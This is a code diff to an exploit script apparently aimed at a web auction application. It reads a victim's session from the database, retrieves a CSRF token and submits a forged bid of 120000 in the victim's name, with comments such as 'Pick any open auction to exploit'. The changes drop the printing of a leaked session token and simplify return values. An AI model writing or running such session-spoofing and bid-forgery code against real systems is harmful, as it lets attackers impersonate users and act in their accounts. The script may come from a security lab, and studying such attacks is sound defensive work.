@@ -13,13 +13,10 @@ def extract_victim_session():
 
         # Step 2: Extract session token for victim
         session = Session.query.filter_by(user_id=victim.id).first()
-        if session:
-            print(f"[+] Leaked session token: {session.token}")
-        else:
-            print("[-] Victim has no active session. Cannot continue.")
-            return None, None
-
-        return victim.id, session.token
+        if not session:
+            print("[-] No session found for victim.")
+            return None
+        return victim.id
 
 
 def spoof_session_and_bid(victim_id, auction_id):
@@ -42,7 +39,7 @@ def spoof_session_and_bid(victim_id, auction_id):
     print(f"[+] Retrieved CSRF token: {csrf_token}")
     
     # Step 2: Set the CSRF token in the session
-    bid_amount = 9999.99
+    bid_amount = 120000
     response = client.post(
             f'/auction/{auction_id}/bid',
             data={
@@ -59,9 +56,8 @@ def spoof_session_and_bid(victim_id, auction_id):
 
 
 def main():
-    victim_id, token = extract_victim_session()
+    victim_id = extract_victim_session()
     if victim_id:
-        # Step 5: Pick any open auction to exploit
         with app.app_context():
             auction = Auction.query.filter_by(status='active').first()
             if auction:
